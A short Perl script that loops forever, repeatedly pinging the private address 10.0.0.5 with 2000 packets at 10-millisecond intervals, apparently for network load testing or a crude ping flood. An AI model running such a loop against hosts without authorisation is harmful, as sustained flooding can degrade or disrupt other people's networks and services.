#!/usr/bin/perl

while(1) {
	sleep(5);
	system("ping -i 0.01 -c 2000 10.0.0.5");
	sleep(15);
}

